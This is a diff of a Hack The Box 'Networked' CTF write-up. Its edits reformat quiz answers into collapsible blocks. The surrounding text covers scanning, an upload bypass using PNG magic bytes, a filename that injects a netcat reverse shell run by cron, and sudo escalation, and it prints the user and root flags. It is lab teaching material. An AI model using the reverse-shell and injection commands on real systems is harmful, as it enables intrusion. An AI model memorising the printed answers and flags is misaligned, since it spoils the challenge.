@@ -52,16 +52,19 @@ Device type: general purpose|router|WAP|media device
 Running (JUST GUESSING): Linux 3.X|4.X|2.6.X|5.X (98%), MikroTik RouterOS 7.X (91%), Asus embedded (88%), Amazon embedded (88%)
 OS CPE: cpe:/o:linux:linux_kernel:3 
 ```
-> [!NOTE]
-> 
-> Which version of Apache is running on the target?
-> 
-> 2.4.6
+
+
+<details>
+  <summary>🟢 Task 1: Which version of Apache is running?</summary>
+  <br>
+  2.4.6
+</details>
 
 ### 1.2 Directory Brute-forcing
 ```BASH
 sudo nmap --script vuln -p80 10.129.26.10
-
+```
+```BASH
 dirb http://10.129.26.10
 ```
 🧐 Findings:
@@ -78,8 +81,8 @@ PORT   STATE SERVICE
 |   /backup/: Backup folder w/ directory listing
 |   /icons/: Potentially interesting folder w/ directory listing
 |_  /uploads/: Potentially interesting folder
-
-
+```
+```Bash
 -----------------
 DIRB v2.22    
 By The Dark Raver
@@ -100,7 +103,7 @@ GENERATED WORDS: 4612
 ==> DIRECTORY: http://10.129.26.10/uploads/ 
 ```
 
-Cool, let's see each one
+***Cool, let's see each one:***
 
 
 `/` > Normal welcoming web page.
@@ -114,12 +117,11 @@ Cool, let's see each one
 
 ![.](https://github.com/referefz/HTB-Writeups/blob/main/images/Networked/3-backup.png)
 
-
-> [!NOTE]
-> 
-> What is the relative path of the directory that contains the backup file on the webserver?
-> 
-> /backup
+<details>
+  <summary>🟢 Task 2: What is the relative path of the directory that contains the backup file on the webserver?</summary>
+  <br>
+  /backup
+</details>
 
 Now, I downloaded the `backup.tar` folder and extracted it, and found ***four files: index.php - lib.php - photos.php - upload.php*** written in PHP for the structure of this website. I examined them all, and here's what I found:
 
@@ -190,12 +192,12 @@ foreach (scandir($path) as $file) {
 * **File display:** Locates the uploads folder and displays (executes/runs) the files.
 
 
-> [!NOTE]
-> 
-> After reading the source code of lib.php we see that JPG, GIF, JPEG, and one other extension can be uploaded via the upload function. What is the other extension? (Enter without the .)
-> 
-> PNG
->
+<details>
+  <summary>🟢 Task 3: After reading the source code of lib.php we see that JPG, GIF, JPEG, and one other extension can be uploaded via the upload function. What is the other extension? (Enter without the .)</summary>
+  <br>
+  PNG
+</details>
+
 
 ---
 
@@ -224,12 +226,11 @@ hexcurse hi.php.png
 All is good..👾
 
 
-> [!NOTE]
-> 
-> MIME types protect website upload functions from uploading files that are not actually the declared file type. Magic bytes are used to bypass this by appending the bytes to the payload file. What are first eight magic bytes for PNG format? (Give your answer as 16 hex characters)
-> 
-> 89504E470D0A1A0A
->
+<details>
+  <summary>🟢 Task 4: MIME types protect website upload functions from uploading files that are not actually the declared file type. Magic bytes are used to bypass this by appending the bytes to the payload file. What are first eight magic bytes for PNG format? (Give your answer as 16 hex characters)</summary>
+  <br>
+  89504E470D0A1A0A
+</details>
 
 
 Let's open a listener on port 9000 with **netcat (nc)** tool and specifying the `-l` (listen), `-v` (verbose), `-n` (numeric only, no DNS), and `-p` (port) flags:
@@ -319,11 +320,11 @@ foreach ($files as $key => $value) {
 * **Cronjob:** The system includes a scheduled task (Cronjob) that runs with the privileges of the user guly and executes the `check_attack.php` script every [3 minutes](https://github.com/referefz/HTB-Writeups/blob/main/images/Networked/crontab-2.png) to check the uploads folder. I can exploit this to escalate my privileges to be user guly!
 
 
-> [!NOTE]
-> 
-> On Linux operating systems, users have the ability to schedule tasks to run at a desired period of time. What is the default task scheduler in Linux?
-> 
-> cron
+<details>
+  <summary>🟢 Task 5: On Linux operating systems, users have the ability to schedule tasks to run at a desired period of time. What is the default task scheduler in Linux</summary>
+  <br>
+  cron
+</details>
 
 
 So, let's open a listener on port 9999, then go back to `/var/www/html/uploads` and create my reverse shell command as a filename which will then automatically run after 3 minutes as a cron job and become guly!!💀
@@ -339,17 +340,20 @@ touch "; nc -c bash 10.10.14.34 9999"
 Grab a sip of coffee and chill for a 3 minutes☕..
 Yaah.. solv these quastions also..
 
-> [!NOTE]
-> 
-> According to the backup of the crontab file for guly, the `check_attack.php` script is executed every how many minutes?
-> 
-> 3
 
-> [!NOTE]
-> 
-> In the check_attack.php script, there is one variable that can be controlled by us and is used in the call of a dangerous function. What is that variable name (including the leading $)?
-> 
-> $value
+<details>
+  <summary>🟢 Task 6: According to the backup of the crontab file for guly, the `check_attack.php` script is executed every how many minutes?</summary>
+  <br>
+  3
+</details>
+
+
+<details>
+  <summary>🟢 Task 7: In the check_attack.php script, there is one variable that can be controlled by us and is used in the call of a dangerous function. What is that variable name (including the leading $)</summary>
+  <br>
+  $value
+</details>
+
 
 
 ![](https://github.com/referefz/HTB-Writeups/blob/main/images/Networked/11-guly.png)
@@ -408,20 +412,22 @@ sudo /usr/local/sbin/changename.sh
 
 FINALLY ! I'm root user!!💥
 
-> [!NOTE]
-> 
-> What is the name of the script that guly can run as root without a password?
-> 
-> changename.sh
+
+<details>
+  <summary>🟢 Task 9: What is the name of the script that guly can run as root without a password?</summary>
+  <br>
+  changename.sh
+</details>
+
 
 ---
 
 ## 🏁 5: Pwn3d !!
 
 
-**User Flag: 72b837cf5b46d8789cf6b69882d762d6**
+**🚩 User Flag: 72b837cf5b46d8789cf6b69882d762d6**
 
-**Root Flag: 0b9eba9fbf03fccf8eaf76491d5f8fa2**
+**🚩 Root Flag: 0b9eba9fbf03fccf8eaf76491d5f8fa2**
 
 We shouled always sanitize user input in system-level scripts, and implement strict extension whitelisting for file uploads.
 
